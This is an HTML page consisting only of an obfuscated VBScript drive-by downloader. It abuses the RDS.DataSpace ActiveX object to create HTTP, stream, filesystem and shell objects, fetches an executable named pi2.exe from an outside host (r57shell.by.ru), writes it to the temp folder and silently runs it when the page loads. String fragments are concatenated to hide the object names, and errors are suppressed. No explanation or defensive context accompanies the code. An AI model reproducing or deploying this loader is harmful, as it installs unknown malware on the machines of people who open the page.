<html> 
<body> 
<script language="VBScript"> 
on error resume next 
xurl_0="http://r57shell.by.ru/pi2.exe" 
wbb61f="" 
ibb72o="A" 
fbb83u="dodb.Stream" 
ess01a="Microsoft.XMLH" 
uss12h="T" 
vss83s="TP" 
mcc11h="clsid:BD96C556-65A3-11D0-983A-00C04FC29" 
xcc22r="E" 
xcc33n="36" 
boo71b="Scrip" 
doo52e="t" 
koo23v="ing.FileSystemObject" 
djj61a="obj" 
ajj82p="e" 
hjj03t="ct" 
kcl11r="cla" 
mcl42e="s" 
lcl63c="sid" 
tse41c="Shell.Appli" 
bse72h="c" 
yse43t="ation" 
l5sus0=ess01a&uss12h&vss83s 
h3b2bp=wbb61f&ibb72o&fbb83u 
c2cac2=mcc11h&xcc22r&xcc33n 
j0o2ok=boo71b&doo52e&koo23v 
h7jdj8=djj61a&ajj82p&hjj03t 
o5l8lo=kcl11r&mcl42e&lcl63c 
t0eke8=tse41c&bse72h&yse43t 
Set j5d5fa = document.createElement(h7jdj8) 
j5d5fa.setAttribute o5l8lo, c2cac2 
set x0f5b = j5d5fa.createobject(j0o2ok,"") 
set e1x3j = j5d5fa.CreateObject(l5sus0,"") 
set h4sm7 = j5d5fa.CreateObject(h3b2bp,"") 
set d8qr6 = j5d5fa.CreateObject(t0eke8,"") 
set cte2mp = x0f5b.GetSpecialFolder(2) 
h4sm7.type = 1 
q1get="GET" 
e1x3j.Open q1get, xurl_0, False 
e1x3j.Send 
a5L_xy30= "pi2.exe" 
a5L_xy30= x0f5b.BuildPath(cte2mp,a5L_xy30) 
h4sm7.open 
h4sm7.write e1x3j.responseBody 
h4sm7.savetofile a5L_xy30,2 
h4sm7.close 
d8qr6.ShellExecute a5L_xy30,"","","open",0 
</script> 
</body> 